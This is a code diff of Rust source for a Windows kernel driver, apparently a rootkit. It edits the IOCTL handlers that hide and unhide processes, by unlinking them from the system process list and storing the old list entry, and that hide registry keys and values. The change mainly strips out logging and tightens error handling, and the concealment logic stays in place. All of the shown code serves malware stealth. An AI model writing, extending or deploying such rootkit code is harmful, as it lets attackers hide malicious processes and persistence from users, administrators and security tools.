@@ -111,70 +111,39 @@ impl IoctlManager {
         }));
 
         // Hide or Unhide the specified process.
-        self.register_handler(HIDE_UNHIDE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
+        self.register_handler(HIDE_UNHIDE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             unsafe {
-                // Retrieve process information from the input buffer.
+                // Retrieves the process information from the input buffer.
                 let target_process = get_input_buffer::<TargetProcess>(stack)?;
                 let pid = (*target_process).pid;
-                let enable = (*target_process).enable;
-        
-                // Log the receipt of the request.
-                log::info!("HIDE/UNHIDE PROCESS handler invoked for PID: {} with enable flag: {}", pid, enable);
-        
-                let status = if enable {
-                    // Log the attempt to hide the process.
-                    log::info!("Attempting to hide process with PID: {}", pid);
-                    
-                    // Hide the process and log the previous state.
-                    match Process::hide_process(pid) {
-                        Ok(previous_list) => {
-                            log::debug!("Process {} hidden. Previous state: {:?}", pid, previous_list);
-                            let mut process_info = PROCESS_INFO_HIDE.lock();
-                            let list_ptr = Box::into_raw(Box::new(previous_list));
-                            process_info.push(TargetProcess {
-                                pid,
-                                list_entry: AtomicPtr::new(list_ptr.cast()),
-                                ..Default::default()
-                            });
-                            STATUS_SUCCESS
-                        },
-                        Err(e) => {
-                            log::error!("Failed to hide process with PID: {}. Error: {:?}", pid, e);
-                            // Return an appropriate NTSTATUS conversion from the error.
-                            e.to_ntstatus()
-                        }
-                    }
+                
+                // Hide or unhide the process based on the 'enable' flag.
+                let status = if (*target_process).enable {
+                    // Hides the process and stores its previous state.
+                    let previous_list = Process::hide_process(pid)?;
+                    let mut process_info = PROCESS_INFO_HIDE.lock();
+                    let list_ptr = Box::into_raw(Box::new(previous_list));
+
+                    process_info.push(TargetProcess {
+                        pid,
+                        list_entry: AtomicPtr::new(list_ptr.cast()),
+                        ..Default::default()
+                    });
+
+                    STATUS_SUCCESS
                 } else {
-                    // Log the attempt to unhide the process.
-                    log::info!("Attempting to unhide process with PID: {}", pid);
-                    let list_entry_result = PROCESS_INFO_HIDE.lock()
+                    // Unhides the process.
+                    let list_entry = PROCESS_INFO_HIDE.lock()
                         .iter()
                         .find(|p| p.pid == pid)
-                        .map(|process| process.list_entry.load(Ordering::SeqCst));
-                    
-                    match list_entry_result {
-                        Some(list_entry) => {
-                            match Process::unhide_process(pid, list_entry.cast()) {
-                                Ok(nt_status) => {
-                                    log::debug!("Process {} unhidden successfully", pid);
-                                    nt_status
-                                },
-                                Err(e) => {
-                                    log::error!("Failed to unhide process with PID: {}. Error: {:?}", pid, e);
-                                    e.to_ntstatus()
-                                }
-                            }
-                        },
-                        None => {
-                            log::error!("Process not found in hidden list for PID: {}", pid);
-                            return Err(ShadowError::ProcessNotFound(pid.to_string()).into());
-                        }
-                    }
+                        .map(|process| process.list_entry.load(Ordering::SeqCst))
+                        .ok_or(ShadowError::ProcessNotFound(pid.to_string()))?;
+
+                    Process::unhide_process(pid, list_entry.cast())?
                 };
-        
-                // Log final status and update IoStatus.
-                log::info!("HIDE/UNHIDE PROCESS handler completed for PID: {} with status: {:#X}", pid, status as u32);
-                (*irp).IoStatus.Information = core::mem::size_of::<TargetProcess>() as u64;
+
+                // Updates the IoStatus and returns the result of the operation.
+                (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64;
                 Ok(status)
             }
         }));
@@ -828,40 +797,23 @@ impl IoctlManager {
         }));
 
         // Handles IOCTL to hide or unhide a registry key.
-        self.register_handler(HIDE_UNHIDE_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
+        self.register_handler(HIDE_UNHIDE_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             unsafe {
                 let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
-                
-                // Log the incoming key and enable flag.
-                log::info!("HIDE handler: Received key: {:?}", (*target_registry).key);
-                log::info!("HIDE handler: Enable flag: {:?}", (*target_registry).enable);
-        
                 let status = shadowx::Registry::modify_key(target_registry, Type::Hide);
-                
-                // Log the status returned from modify_key.
-                log::info!("HIDE handler: modify_key returned status: {:?}", status);
-        
-                (*irp).IoStatus.Information = core::mem::size_of::<TargetRegistry>() as u64;
+
+                (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
                 Ok(status)
             }
         }));
-        
 
         // Handles IOCTL to hide or unhide a registry value.
-        self.register_handler(HIDE_UNHIDE_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
+        self.register_handler(HIDE_UNHIDE_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             unsafe {
                 let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
-                
-                // Log the key and enable flag for the registry value.
-                log::info!("HIDE value handler: Received key: {:?}", (*target_registry).key);
-                log::info!("HIDE value handler: Enable flag: {:?}", (*target_registry).enable);
-        
                 let status = shadowx::Registry::modify_key_value(target_registry, Type::Hide);
-                
-                // Log the status returned from modify_key_value.
-                log::info!("HIDE value handler: modify_key_value returned status: {:?}", status);
-        
-                (*irp).IoStatus.Information = core::mem::size_of::<TargetRegistry>() as u64;
+
+                (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
                 Ok(status)
             }
         }));
